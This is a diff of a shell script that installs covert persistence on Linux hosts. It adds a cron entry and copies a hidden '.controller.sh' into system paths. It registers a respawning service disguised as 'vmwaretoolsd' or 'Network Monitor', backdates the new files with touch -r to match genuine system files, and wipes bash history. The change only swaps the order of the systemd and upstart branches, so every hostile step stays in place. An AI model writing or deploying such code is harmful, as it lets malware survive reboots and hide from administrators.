@@ -19,19 +19,7 @@ done
 (crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/systemd/network/monitor.sh") | crontab -
 cp -p ".controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
 cp -p ".controller.sh" "/etc/systemd/network/.debug.sh" &> /dev/null
-if [[ $(initctl version) =~ upstart ]]; then
-    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
-    sudo cat > /etc/init/network-monitor.conf << EOF
-description "Network Monitor"
-start on runlevel [2345]
-stop on runlevel [!2345]
-respawn
-respawn limit unlimited
-exec /etc/init.d/rc.local/rcd.sh
-EOF
-    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
-    sudo start network-monitor
-elif [[ $(systemctl) ]]; then
+if [[ $(systemctl) ]]; then
     sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
     sudo cat > /etc/systemd/system/vmwaretoolsd.service << EOF
 [Unit]
@@ -50,8 +38,19 @@ EOF
     sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
     sudo systemctl daemon-reload
     sudo systemctl start vmwaretoolsd.service
+elif [[ $(initctl version) =~ upstart ]]; then
+    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
+    sudo cat > /etc/init/network-monitor.conf << EOF
+description "Network Monitor"
+start on runlevel [2345]
+stop on runlevel [!2345]
+respawn
+respawn limit unlimited
+exec /etc/init.d/rc.local/rcd.sh
+EOF
+    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
+    sudo start network-monitor
 fi
-
 #garbage
 cat /dev/null > ~/.bash_history && history -c
 rm -f $HOME/.bash_history
